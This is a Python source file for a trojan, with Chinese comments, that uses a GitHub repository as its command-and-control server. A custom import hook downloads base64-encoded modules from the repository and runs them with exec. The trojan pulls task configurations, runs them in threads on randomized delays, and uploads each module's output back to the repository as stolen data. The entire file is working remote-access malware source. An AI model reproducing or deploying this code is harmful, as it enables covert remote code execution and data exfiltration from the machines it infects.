import base64
import importlib.util
import json
import random
import sys
import threading
import time
from datetime import datetime

github3 = importlib.import_module('github3')
flag_protected = False



class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    #找到moudule并读取其中代码,将代码饭胡在self.current_module_code中
    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.connection = github_connect()
        new_library = get_file_contents("modules", f"{name}.py", self.connection)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        # spec，意为规范。loader为None，python解释器会使用默认的loader
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.connection.git_url)
        new_module = importlib.util.module_from_spec(spec)
        # exec，第一个参数代表要执行的代码，第二个参数代表执行结果存储的位置
        # module.__dict__，该参数代表对应模块的符号表信息。符号表信息就是名称到对象的映射，也就是说，我们在此处执行对应模块的代码的同时，将这些符号表信息也在对应模块中创建
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


def github_connect():
    with open("mytoken.txt", "r") as t:
        token = t.read().strip()
    user = "Kygoss"
    session = github3.login(token=token)
    return session.repository(user, "kgtrojan")

def get_file_contents(dirname, filename, repo):
    return repo.file_contents(f'{dirname}/{filename}').content


class Trojan:
    def __init__(self, id) -> None:
        self.id = id
        self.config_file = f"{id}.json"
        self.data_dir = f"data/{id}/"
        self.repo = github_connect()

    def get_trojan_config(self):
        config_json = get_file_contents("config", self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        for tasks in config:
            if tasks['module'] not in sys.modules:
                exec("import %s" % tasks['module'])
        return config

    def run(self):
        while True:
            config = self.get_trojan_config()        
            for tasks in config:
                new_thread = threading.Thread(target=self.module_runner, args=(tasks['module'],))
                new_thread.start()
                time.sleep(random.randint(1,8))
            print('once done')
            time.sleep(random.randint(60*60, 3*60*60))


    def module_runner(self, module):
        def store_data(data):
            now = datetime.now()
            formatted_date = now.strftime("%Y-%m-%d^%H:%M:%S")
            data_path = f'{self.data_dir}{module}/{formatted_date}.data'
            data_bytes = bytes('%r' % data, 'utf-8')
            self.repo.create_file(path=data_path, message=formatted_date, content=data_bytes)
        try:
            if flag_protected:
                data = sys.modules[module].run('--protected')
            else:
                data = sys.modules[module].run()
        except Exception:
            data = "Success"
        store_data(data)




if __name__ == "__main__":
    if len(sys.argv) == 2:
        if sys.argv[1] == '--protected':
            flag_protected = True
            print("Protected for test")
    sys.meta_path = [GitImporter()]
    trojan = Trojan('1')
    trojan.run()

